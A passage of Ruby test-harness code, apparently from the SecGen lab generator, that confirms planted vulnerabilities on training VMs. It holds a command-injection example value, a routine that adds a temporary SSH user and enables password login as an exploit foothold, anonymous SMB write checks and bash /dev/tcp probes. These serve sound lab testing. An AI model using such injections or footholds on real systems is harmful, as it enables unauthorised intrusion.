                 "#{success_prefix}; sentinel #{sentinel} contains #{body[/uid=\S+/]}#{expect_privilege ? " — <privilege>=#{expect_privilege} verified#{privilege_note(body)}" : ''}.",
                 tier: tier)
    end
  end

  # Create a throwaway unprivileged account on *this* system (the target) with a
  # random password, make sure sshd accepts a password login for it, yield
  # [user, pass] to the block, then delete the account and restore sshd on the
  # way out (even if the block raises). Runs as root over the guest agent.
  #
  # For local-privesc modules whose Metasploit exploit needs a pre-existing
  # low-privilege SESSION (e.g. exploit/unix/local/chkrootkit): the attacker's
  # ssh_login lands on this account to open the foothold. The credential exists
  # only for the duration of the block, so the vulnerable image has no extra
  # login baked in. A sshd_config drop-in (first match wins) re-enables password
  # auth regardless of a base's cloud-init default, and is removed afterwards.
  def with_throwaway_ssh_user(user: nil, pass: nil)
    user ||= "secgen_t3_#{rand(100_000)}"
    pass ||= "T3pw_#{rand(10**12)}"
    dropin = '/etc/ssh/sshd_config.d/00-secgen-test.conf'
    creds = Shellwords.escape("#{user}:#{pass}")
    setup = "set -e; id -u #{user} >/dev/null 2>&1 || useradd -m -s /bin/bash #{user}; " \
            "echo #{creds} | chpasswd; mkdir -p /etc/ssh/sshd_config.d; " \
            "printf 'PasswordAuthentication yes\\nKbdInteractiveAuthentication yes\\nUsePAM yes\\n' > #{dropin}; " \
            "(systemctl reload ssh || systemctl reload sshd || systemctl restart ssh || systemctl restart sshd || true) 2>/dev/null; sleep 3"
    r = run_vagrant_ssh(setup, timeout: 60)
    skip!("could not set up throwaway SSH user #{user}: #{r[:stderr].to_s.strip[0, 200]}") unless r[:exit_status] == 0
    yield user, pass
  ensure
    teardown = "pkill -u #{user} 2>/dev/null; userdel -r #{user} 2>/dev/null; " \
               "rm -f #{dropin} /tmp/update; " \
               "(systemctl reload ssh || systemctl reload sshd || true) 2>/dev/null"
    begin
      run_vagrant_ssh(teardown, timeout: 60)
    rescue StandardError
      nil
    end
  end

  # True when the exploited shell's privilege (parsed from the sentinel's `id`
  # and `sudo -n -l` output) matches the module's declared <privilege>:
  # root_rwx wants root or a sudoer; user_rwx wants a non-root, non-sudoer shell.
  # Group membership in sudo/admin/wheel is the primary sudoer signal; a
  # passwordless `sudo -l` is a secondary one (a password-required sudoer not in
  # those groups cannot be detected from a non-interactive shell, so user_rwx is
  # asserted on uid + groups + passwordless-sudo, which covers the SecGen cases).
  def privilege_matches?(body, level)
    uid    = body[/uid=(\d+)/, 1]&.to_i
    groups = body[/groups=([^\n]*)/, 1].to_s
    sudo   = body[/secgen_sudo_begin(.*?)secgen_sudo_end/m, 1].to_s
    is_root = uid == 0
    sudoer  = (groups =~ /\((?:sudo|admin|wheel)\)/) || (sudo =~ /NOPASSWD|may run|\(ALL/) ? true : false
    case level.to_s
    when 'uid0' then is_root
    when 'root', 'root_rwx' then is_root || sudoer
    when 'user', 'user_rwx' then !is_root && !sudoer
    else false
    end
  end

  def validate_expect_privilege!(level)
    return if level.nil? || %w[root root_rwx user user_rwx].include?(level.to_s)
    raise ArgumentError, "expect_privilege must be root, root_rwx, user or user_rwx (got #{level.inspect})"
  end

  # Short parenthetical for the check detail: whether the shell user can sudo.
  def privilege_note(body)
    groups = body[/groups=([^\n]*)/, 1].to_s
    sudo   = body[/secgen_sudo_begin(.*?)secgen_sudo_end/m, 1].to_s
    sudoer = (groups =~ /\((?:sudo|admin|wheel)\)/) || (sudo =~ /NOPASSWD|may run|\(ALL/) ? true : false
    " (#{sudoer ? 'sudoer' : 'no sudo'})"
  end

  # Render an msf datastore value for a `set` line inside the -x string: quote
  # in single quotes if it contains whitespace or shell metacharacters.
  def msf_set_value(value)
    s = value.to_s
    s =~ /[\s;'"|&<>$`]/ ? "'#{s.gsub("'", %q('\\''))}'" : s
  end

  # --- HTTP exploit helpers (tier 3, non-Metasploit) ----------------------
  # For web vulns with no Metasploit module: craft the attack as raw HTTP
  # request(s) run with curl *on the attacker VM* (run_on_system), so the
  # traffic crosses the scenario network exactly as a remote attacker's would —
  # the same attacker-VM / guest-agent shape as test_msf_exploit.

  # Run one HTTP request with curl on the attacker against the target. Returns
  # {status:, body:, error:, curl:} (status 0 means the request didn't complete).
  def http_from_attacker(path, attacker:, rhost:, method: 'GET', data: nil,
                         headers: {}, include_headers: false, rport: self.port,
                         scheme: 'http', timeout: 60)
    path = "/#{path}" unless path.to_s.start_with?('/')
    url = "#{scheme}://#{rhost}:#{rport.to_i}#{path}"
    marker = HTTP_STATUS_MARKER
    argv = ['curl', '-sk', '--max-time', timeout.to_s, '-X', method.to_s.upcase]
    argv << '-D' << '-' if include_headers   # dump response headers into :body
    headers.each { |k, v| argv += ['-H', "#{k}: #{v}"] }
    argv += ['--data-binary', data.to_s] unless data.nil?
    argv += ['-o', '-', '-w', "\\n#{marker}%{http_code}", url]
    curl = argv.map { |a| Shellwords.escape(a) }.join(' ')

    result = run_on_system(attacker, curl, timeout: timeout + 30)
    out = result[:stdout].to_s
    idx = out.rindex(marker)
    if idx.nil?
      return { status: 0, body: out, curl: curl,
               error: "no HTTP response from attacker curl (#{result[:stderr].to_s.strip[0, 200]})" }
    end
    status = out[(idx + marker.size)..-1].to_i
    body = out[0...idx].sub(/\n\z/, '')
    { status: status, body: body, curl: curl,
      error: status.zero? ? "curl could not reach #{rhost}:#{rport}" : nil }
  end

  # Tier-3 web exploit driven from the attacker VM, recorded as PASS/FAIL/SKIP.
  # Proof comes in either (or both) of the two shapes real web exploits take:
  #   * expect:  a String (substring) or Regexp the *response body* must contain
  #              / match — data exfiltration, auth bypass, path traversal, where
  #              the proof is what the server sends back. expect_status: also
  #              asserts the HTTP status code.
  #   * sentinel: true — the request runs a command *on the target* (command
  #              injection); proof is a sentinel the target's own guest agent
  #              reads back (checked for `uid=`), exactly as test_msf_exploit
  #              does. Put the placeholder {{CMD}} in path/data/a header value
  #              where the injected shell belongs; it is replaced with the
  #              sentinel-writing command. collect: appends extra shell whose
  #              output is captured into the sentinel as evidence.
  # The check PASSes only if every requested assertion holds.
  #
  # include_headers: true prepends the response headers to what `expect` matches
  # against, so assertions can target a header (e.g. a 302 Location, a Set-Cookie
  # or a Server banner) rather than the body.
  #
  #   test_http_exploit('/login.php', method: 'POST',
  #                     data: "username=#{inj}&password=x",
  #                     expect: 'Login successful')
  #   test_http_exploit('/vuln?host=127.0.0.1;{{CMD}};', sentinel: true)
  def test_http_exploit(path, method: 'GET', data: nil, headers: {},
                        expect: nil, expect_status: nil, sentinel: false,
                        collect: nil, include_headers: false, attacker: nil,
                        rhost: nil, rport: self.port, scheme: 'http', tier: 3,
                        label: nil, timeout: 120, sentinel_dir: '/tmp')
    name = label || "http exploit (#{method.to_s.upcase} #{path})"
    if expect.nil? && expect_status.nil? && !sentinel
      return fail_check(name, "#{name}: no expect:, expect_status: or sentinel:, so nothing proves the exploit worked", tier: tier)
    end
    if expect == '' || (expect.is_a?(Regexp) && '' =~ expect)
      return fail_check(name, "#{name}: expect: #{expect.inspect} matches an empty response, so it proves nothing", tier: tier)
    end
    resolved = resolve_attacker(name, attacker, rhost, tier)
    return unless resolved
    attacker, attacker_ip, rhost = resolved

    sentinel_path = nil
    if sentinel
      sentinel_path, scmd = build_sentinel(collect, dir: sentinel_dir)
      sub = ->(s) { s.nil? ? nil : s.to_s.gsub('{{CMD}}', scmd) }
      path = sub.call(path)
      data = sub.call(data)
      headers = headers.map { |k, v| [k, sub.call(v)] }.to_h
    end

    resp = http_from_attacker(path, method: method, data: data, headers: headers,
                              include_headers: include_headers, attacker: attacker,
                              rhost: rhost, rport: rport, scheme: scheme, timeout: timeout)
    add_evidence('http_request', "echo #{Shellwords.escape(resp[:curl])}")
    add_evidence('http_response',
                 "echo #{Shellwords.escape("HTTP #{resp[:status]}\n#{resp[:body].to_s[0, 4000]}")}")

    checks = []
    unless expect.nil?
      body = resp[:body].to_s
      ok = expect.is_a?(Regexp) ? !(body =~ expect).nil? : body.include?(expect.to_s)
      checks << ["response body matches #{expect.inspect}", ok]
    end
    checks << ["HTTP status == #{expect_status}", resp[:status].to_i == expect_status.to_i] unless expect_status.nil?
    if sentinel
      checks << ['target sentinel proves command execution (uid=)', sentinel_pwned?(read_sentinel(sentinel_path))]
    end

    detail = checks.map { |lbl, ok| "#{ok ? 'ok' : 'FAILED'}: #{lbl}" }.join('; ')
    origin = "from #{attacker} (#{attacker_ip}) against #{rhost}:#{rport}"
    http = "HTTP #{resp[:status]}#{resp[:error] ? " (#{resp[:error]})" : ''}"
    if checks.all? { |_, ok| ok }
      pass_check(name, "Web exploit confirmed #{origin} — #{detail}. #{http}.", tier: tier)
    else
      fail_check(name, "Web exploit not confirmed #{origin} — #{detail}. #{http}. See http_request/http_response evidence.", tier: tier)
    end
  end

  # --- SMB shares (Samba) ---------------------------------------------------
  # Share checks a student would make: list and write a share anonymously with
  # smbclient on the attacker VM. Don't install smbclient on the target just for
  # the test; if the attacker base lacks it, add utilities/unix/smb/smbclient to
  # the attacker system in the module's test scenario.

  # The [share] name and comment as the samba module's smb_share.conf.erb
  # renders them from these inputs: an `organisation` input renames the share to
  # <first label of its domain>_public_share and its comment to
  # "<business_name> Public SMB Share". Returns [name, comment].
  def samba_share_name(inputs = json_inputs)
    inputs ||= {}
    name = Array(inputs['share_name']).first
    comment = Array(inputs['share_comment']).first
    org = Array(inputs['organisation']).first.to_s
    unless org.empty?
      parsed = JSON.parse(org)
      name = "#{parsed['domain'].to_s.split('.').first}_public_share"
      comment = "#{parsed['business_name']} Public SMB Share"
    end
    [name, comment]
  end

  # One anonymous (-N) smbclient call from the attacker against rhost. Without
  # share: lists the shares (-L); with share: connects to //rhost/share and runs
  # `commands` (smbclient -c). Returns {stdout:, exit_status:, cmd:}; stderr is
  # folded into stdout, where smbclient prints its NT_STATUS errors.
  def smbclient_from_attacker(attacker:, rhost:, share: nil, commands: nil, timeout: 60)
    argv = share ? ['smbclient', "//#{rhost}/#{share}", '-N'] : ['smbclient', '-L', "//#{rhost}", '-N']
    argv += ['-c', commands] if commands
    cmd = argv.map { |a| Shellwords.escape(a) }.join(' ')
    result = run_on_system(attacker, "#{cmd} 2>&1", timeout: timeout)
    { stdout: result[:stdout].to_s, exit_status: result[:exit_status], cmd: cmd }
  end

  # PASS if an anonymous share listing from the attacker VM shows `share` as a
  # Disk share (and `comment` on its line, when given). SKIP without an attacker.
  def test_smb_share_listed(share, comment: nil, attacker: nil, rhost: nil, tier: nil, label: nil)
    tier = default_tier(tier, 2)
    name = label || "share #{share} listed anonymously"
    resolved = resolve_attacker(name, attacker, rhost, tier)
    return unless resolved
    attacker, _attacker_ip, rhost = resolved

    res = smbclient_from_attacker(attacker: attacker, rhost: rhost)
    out = res[:stdout]
    add_evidence('smbclient_listing', "echo #{Shellwords.escape(out[0, 2000])}")
    line = out.lines.find { |l| l =~ /^\s+#{Regexp.escape(share)}\s+Disk\b/i }
    if line.nil?
      fail_check(name, "#{res[:cmd]} on #{attacker} did not list #{share}: #{out[0, 500]}", tier: tier)
    elsif comment && !comment.empty? && !line.include?(comment)
      fail_check(name, "#{share} listed without comment #{comment.inspect}: #{line.strip}", tier: tier)
    else
      pass_check(name, "#{res[:cmd]} on #{attacker} lists #{line.strip}", tier: tier)
    end
  end

  # Upload a nonce file anonymously from the attacker VM into `share`, then look
  # for it in `directory` (the share's path) on this system and remove it. PASS
  # if the write landed, or with expect_writable: false, if it was refused.
  def test_smb_anonymous_write(share, directory, expect_writable: true, attacker: nil, rhost: nil,
                               tier: nil, label: nil)
    tier = default_tier(tier, 2)
    name = label || 'anonymous write to share'
    resolved = resolve_attacker(name, attacker, rhost, tier)
    return unless resolved
    attacker, _attacker_ip, rhost = resolved

    nonce = "secgen_smb_#{Time.now.to_i}_#{rand(100000)}"
    run_on_system(attacker, "echo #{nonce} > /tmp/#{nonce}")
    res = smbclient_from_attacker(attacker: attacker, rhost: rhost, share: share,
                                  commands: "put /tmp/#{nonce} #{nonce}")
    run_on_system(attacker, "rm -f /tmp/#{nonce}")
    add_evidence('smbclient_put', "echo #{Shellwords.escape(res[:stdout][0, 2000])}")

    landed = Shellwords.escape(File.join(directory, nonce))
    present = run_command("test -f #{landed} && echo present")[:stdout].to_s.include?('present')
    run_command("rm -f #{landed}")
    if present == expect_writable
      pass_check(name, expect_writable ? "file put anonymously from #{attacker} appeared in #{directory}" :
                                         "anonymous put from #{attacker} was refused, as configured", tier: tier)
    else
      fail_check(name, "expected the put to #{expect_writable ? 'succeed' : 'be refused'}; " \
                       "#{res[:cmd]} said: #{res[:stdout][0, 500]}", tier: tier)
    end
  end

  # PASS if Samba's effective value for one share parameter (testparm, which
  # ships with samba, so it runs on the target) equals `value`, case-insensitive.
  # Asking for the parameter by name also reports defaults, which `testparm -s`
  # omits (e.g. `guest ok = No`).
  def test_smb_share_setting(share, parameter, value, tier: nil, label: nil)
    tier = default_tier(tier, 2)
    cmd = "testparm -s --section-name=#{Shellwords.escape(share)} " \
          "--parameter-name=#{Shellwords.escape(parameter)} 2>/dev/null"
    name = label || "[#{share}] #{parameter} = #{value}"
    actual = run_command(cmd)[:stdout].to_s.strip
    if actual.casecmp?(value.to_s)
      pass_check(name, "#{cmd} gives #{actual} on #{get_system_name}", tier: tier)
    else
      fail_check(name, "#{cmd} gives #{actual.inspect}, expected #{value}", tier: tier)
    end
  end

  # Run a shell command as the given account (login shell, that user's
  # environment) rather than root.
  def run_as_user(user, command, timeout: 90)
    run_vagrant_ssh(as_user_command(user, command, sudo: !proxmox?), timeout: timeout)
  end

  def as_user_command(user, command, sudo: false)
    u = Shellwords.escape(user)
    c = Shellwords.escape(command)
    s = sudo ? 'sudo ' : ''
    "if command -v runuser >/dev/null 2>&1; then #{s}runuser -u #{u} -- bash -lc #{c}; " \
      "else #{s}su -s /bin/bash -l #{u} -c #{c}; fi"
  end

  # GET a page. On Proxmox, from inside the guest (curl, wget or bash /dev/tcp,
  # whichever exists), against 127.0.0.1 then the guest's own IP; otherwise from
  # this host. Returns {status:, body:, error:}.
  def http_get(path, port: self.port, scheme: 'http')
    path = "/#{path}" unless path.start_with?('/')
    return host_http_get(path, port, scheme) unless proxmox?

    response = guest_http_get('127.0.0.1', path, port, scheme)
    if response[:status].to_i == 0
      ip = resolved_ip_or_nil
      response = guest_http_get(ip, path, port, scheme) if ip && ip != '127.0.0.1'
    end
    response
  end

  ############################
  # Proxmox (Guest Agent)    #
  ############################

  # Memoised test_context.json ({url, user, systems}), or nil if this isn't a Proxmox build.
  def test_context
    return @test_context if defined?(@test_context)
    ctx_path = "#{get_project_path}/test_context.json"
    @test_context = File.exist?(ctx_path) ? JSON.parse(File.read(ctx_path)) : nil
  end

  def proxmox?
    !test_context.nil? && File.exist?(proxmox_id_path) && !!defined?(Proxmox::Connection)
  end

  # This system's id-file path / [node, vmid] — the sibling helpers applied to
  # ourselves (see the cross-system helpers section).
  def proxmox_id_path
    other_proxmox_id_path(get_system_name)
  end

  def proxmox_node_vmid
    other_proxmox_node_vmid(get_system_name)
  end

  def proxmox_connection
    return @proxmox_connection if @proxmox_connection
    password = ENV['SECGEN_PROXMOX_PASS']
    if password.nil? || password.empty?
      skip!('SECGEN_PROXMOX_PASS is not set; cannot reach the Proxmox API for testing.')
    end
    @proxmox_connection = Proxmox::Connection.new(test_context['url'])
    @proxmox_connection.login(username: test_context['user'], password: password)
    @proxmox_connection
  end

  # Wait (up to SECGEN_AGENT_WAIT seconds, default 60) for the guest agent to
  # answer; SKIP if it never does.
  def wait_for_guest_agent(timeout = (ENV['SECGEN_AGENT_WAIT'] || 60).to_i)
    node, vmid = proxmox_node_vmid
    deadline = Time.now + timeout
    loop do
      return true if proxmox_connection.qemu_agent_running?(vmid, node)
      skip!("QEMU Guest Agent on VM #{vmid} did not respond within #{timeout}s") if Time.now >= deadline
      sleep 5
    end
  end

  # Is the given TCP port listening inside the guest? (checked locally on the guest)
  def guest_port_listening?(port)
    # ss is present on modern Debian/Kali; fall back to a bash /dev/tcp probe.
    cmd = "ss -ltn 2>/dev/null | grep -q ':#{port.to_i} ' && echo LISTENING || " \
          "(exec 3<>/dev/tcp/127.0.0.1/#{port.to_i} && echo LISTENING) 2>/dev/null"
    run_vagrant_ssh(cmd, timeout: 15)[:stdout].include?('LISTENING')
  end

  # The system's IP, resolved on first use. SKIPs the test if it can't be found.
  def system_ip
    @system_ip ||= get_system_ip
  end

  def get_system_ip
    if proxmox?
      # first non-loopback IPv4 from agent/network-get-interfaces (our own guest)
      ip = other_system_ip(get_system_name)
      skip!("Could not determine #{get_system_name}'s IP via the QEMU Guest Agent") if ip.nil?
      return ip
    end
    vagrant_file_path = "#{get_project_path}/Vagrantfile"
    vagrantfile = File.read(vagrant_file_path)
    ip_line = vagrantfile.split("\n").delete_if {|line| !line.include? "# ip_address_for_#{get_system_name}"}[0]
    skip!("No IP for #{get_system_name} in the Vagrantfile") if ip_line.nil?
    ip_address = ip_line.split('=')[-1].strip
    skip!("Cannot test #{get_system_name} over the network: it uses DHCP") if ip_address == "DHCP"
    ip_address
  end

  def get_json_inputs
    json_inputs_path = "#{File.expand_path('../', self.module_path)}/secgen_functions/files/json_inputs/*"
    json_inputs_files = Dir.glob(json_inputs_path)
    json_inputs_files.delete_if do |path|
      end_path = path.split('/')[-1]
      !end_path.include?(self.module_name)
    end
    if json_inputs_files.size > 0
      return JSON.parse(Base64.strict_decode64(File.read(json_inputs_files.first)))
    end
    {}
  end

  def get_port
    if get_json_inputs != {} and get_json_inputs['port'] != nil
      get_json_inputs['port'][0].to_i
    else
      -1
    end
  end

  # Pass __FILE__ in from subclasses
  def get_module_path(file_path)
    "#{File.expand_path('..', File.dirname(file_path))}"
  end

  # Note: returns proftpd_testing
  def get_system_name
    get_system_path.match(/.*?([^\/]*)$/i).captures[0]
  end

  # Note: returns /home/thomashaw/git/SecGen/projects/SecGen20190202_010552/puppet/proftpd_testing
  def get_system_path
    "#{File.expand_path('../../', self.module_path)}"
  end

  # Note: returns /home/thomashaw/git/SecGen/projects/SecGen20190202_010552/
  def get_project_path
    "#{File.expand_path('../../../../', self.module_path)}"
  end

  # The module's directory name in the project (unique per system), e.g. proftpd.
  def module_dir_name
    File.basename(self.module_path)
  end

  # projects/<id>/test_results/<system>/
  def results_dir
    "#{get_project_path}/test_results/#{get_system_name}"
  end

  def is_port_open?(ip, port)
    retries = 5
    while retries > 0
      begin
        Timeout::timeout(2) do
          begin
            s = TCPSocket.new(ip, port)
            s.close
            return true
          rescue Errno::ECONNREFUSED, Errno::EHOSTUNREACH
            # do nothing
          end
        end
      rescue Timeout::Error
        # ignored
      end
      retries -= 1
    end
    false
  end

  private

  # Legacy tests push "PASSED: ..." / "FAILED: ..." lines; record them as checks.
  def record_legacy_line(line)
    return unless line.is_a?(String)
    status = { 'PASSED:' => 'PASS', 'FAILED:' => 'FAIL', 'SKIPPED:' => 'SKIP' }.find { |p, _| line.start_with?(p) }&.last
    return unless status
    text = line.sub(/\A\w+:\s*/, '')
    @results << { tier: @current_tier || 1, name: text[0, 200], status: status, detail: text }
    self.all_tests_passed = false if status == 'FAIL'
  end

  # For messages only: the IP if already known/resolvable, never SKIPs.
  def ip_label
    resolved_ip_or_nil || 'unknown IP'
  end

  def resolved_ip_or_nil
    return nil if @ip_unresolvable
    system_ip
  rescue SkipTest, StandardError
    @ip_unresolvable = true
    nil
  end

  def host_http_get(path, port, scheme)
    http = Net::HTTP.new(system_ip, port)
    http.use_ssl = scheme == 'https'
    http.verify_mode = OpenSSL::SSL::VERIFY_NONE if http.use_ssl?
    http.open_timeout = 10
    http.read_timeout = 15
    response = http.get(path)
    { status: response.code.to_i, body: response.body.to_s, error: nil }
  rescue SkipTest
    raise
  rescue StandardError => e
    { status: 0, body: '', error: "#{e.class}: #{e.message}" }
  end

  HTTP_STATUS_MARKER = '__SECGEN_HTTP_STATUS__'.freeze

  def guest_http_get(host, path, port, scheme)
    url = Shellwords.escape("#{scheme}://#{host}:#{port.to_i}#{path}")
    request = Shellwords.escape("GET #{path} HTTP/1.0\\r\\nHost: #{host}\\r\\nConnection: close\\r\\n\\r\\n")
    m = HTTP_STATUS_MARKER
    cmd = "if command -v curl >/dev/null 2>&1; then " \
            "curl -sk --max-time 15 -o - -w '\\n#{m}%{http_code}' #{url}; " \
          "elif command -v wget >/dev/null 2>&1; then " \
            "wget -q -O - --no-check-certificate -T 15 -S #{url} 2>/tmp/.secgen_wget_hdr; rc=$?; " \
            "code=$(awk '/^  HTTP\\//{c=$2} END{print c}' /tmp/.secgen_wget_hdr); rm -f /tmp/.secgen_wget_hdr; " \
            "printf '\\n#{m}%s' \"${code:-000}\"; " \
          "else " \
            "out=$(timeout 15 bash -c 'exec 3<>/dev/tcp/#{host}/#{port.to_i} && printf %b \"$1\" >&3 && cat <&3' _ #{request} 2>/dev/null); " \
            "code=$(printf '%s' \"$out\" | head -1 | awk '{print $2}'); " \
            "printf '%s' \"$out\" | sed '1,/^\\r\\{0,1\\}$/d'; printf '\\n#{m}%s' \"${code:-000}\"; " \
          "fi"
    result = run_vagrant_ssh(cmd, timeout: 30)
    out = result[:stdout]
    idx = out.rindex(m)
    return { status: 0, body: '', error: "no HTTP response (#{result[:stderr].to_s.strip[0, 200]})" } if idx.nil?
    status = out[(idx + m.size)..-1].to_i
    body = out[0...idx].sub(/\n\z/, '')
    { status: status, body: body, error: status == 0 ? "could not connect to #{host}:#{port}" : nil }
  end

  def read_banner(port, send: nil)
    if proxmox?
      cmd = "timeout 10 bash -c 'exec 3<>/dev/tcp/127.0.0.1/#{port.to_i} || exit 1; " \
            "[ -n \"$1\" ] && printf \"%s\\r\\n\" \"$1\" >&3; timeout 3 cat <&3' _ " \
            "#{Shellwords.escape(send.to_s)} 2>/dev/null | head -c 4096"
      return run_vagrant_ssh(cmd, timeout: 20)[:stdout].to_s
    end
    data = ''.dup
    Timeout.timeout(10) do
      sock = TCPSocket.new(system_ip, port)
      sock.write("#{send}\r\n") if send
      while IO.select([sock], nil, nil, 3)
        chunk = sock.read_nonblock(4096, exception: false)
        break if chunk.nil? || chunk == :wait_readable
        data << chunk
        break if data.size >= 4096
      end
      sock.close
    end
    data
  rescue SkipTest
    raise
  rescue StandardError
    data || ''
  end

  # Standard evidence for a failed module (service status, recent journal,
  # listening ports) plus anything added with add_evidence, in one guest call.
  def evidence_commands
    unit = Shellwords.escape("*#{module_name}*")
    {
      'failed_units' => 'systemctl --no-pager --failed 2>&1',
      'service_status' => "systemctl --no-pager --all status #{unit} 2>&1 | head -150",
      'journal' => 'journalctl --no-pager -b -n 200 2>&1',
      'listening_ports' => 'ss -ltnup 2>&1 || netstat -ltnup 2>&1',
      'processes' => 'ps auxf 2>&1 | head -200'
    }.merge(@extra_evidence)
  end

  EVIDENCE_MARKER = '===SECGEN_EVIDENCE '.freeze

  def collect_evidence
    commands = evidence_commands
    script = commands.map { |name, cmd| "echo '#{EVIDENCE_MARKER}#{name}==='; ( #{cmd} )" }.join("\n")
    output = run_vagrant_ssh(script, timeout: 60)
    files = []
    output[:stdout].split(/^#{Regexp.escape(EVIDENCE_MARKER)}/).each do |section|
      name, body = section.split("===\n", 2)
      next if body.nil? || !commands.key?(name)
      files << save_evidence(name, "$ #{commands[name]}\n#{body}")
    end
    files.compact!
    @results.each { |r| r[:evidence] = ((r[:evidence] || []) + files).uniq if r[:status] == 'FAIL' }
    files
  rescue SkipTest, StandardError => e
    warn "WARNING: could not collect evidence: #{e.class}: #{e.message}"
    []
  end

  # Writes evidence/<module>/<name>.txt; returns its path relative to results_dir.
  def save_evidence(name, text)
    return nil if text.nil?
    rel = "evidence/#{module_dir_name}/#{name.to_s.gsub(/[^\w.-]/, '_')}.txt"
    FileUtils.mkdir_p(File.dirname("#{results_dir}/#{rel}"))
    File.write("#{results_dir}/#{rel}", text)
    rel
  rescue StandardError => e
    warn "WARNING: could not save evidence #{name}: #{e.message}"
    nil
  end

  # Repo path of the module (e.g. modules/services/unix/ftp/proftpd), from the
  # project's resolved scenario.xml; nil if it can't be found.
  def repo_module_path
    doc = REXML::Document.new(File.read("#{get_project_path}/scenario.xml"))
    doc.root.each_element('system') do |system|
      next unless system.elements['system_name']&.text.to_s.strip == get_system_name
      system.each_element('*[@module_path]') do |mod|
        path = mod.attributes['module_path']
        return path if File.basename(path) == module_dir_name
      end
    end
    nil
  rescue StandardError
    nil
  end

  def write_results(status)
    finished = Time.now
    data = {
      module: module_dir_name,
      module_path: repo_module_path,
      test: self.class.name,
      system: get_system_name,
      backend: proxmox? ? 'proxmox-guest-agent' : 'vagrant',
      started_at: (@started_at || finished).iso8601,
      duration_s: (finished - (@started_at || finished)).round(1),
      status: status,
      tier_reached: tier_reached,
      results: @results
    }
    FileUtils.mkdir_p(results_dir)
    File.write("#{results_dir}/#{module_dir_name}.json", JSON.pretty_generate(data) + "\n")
  rescue StandardError => e
    warn "WARNING: could not write test results JSON: #{e.class}: #{e.message}"
  end
end
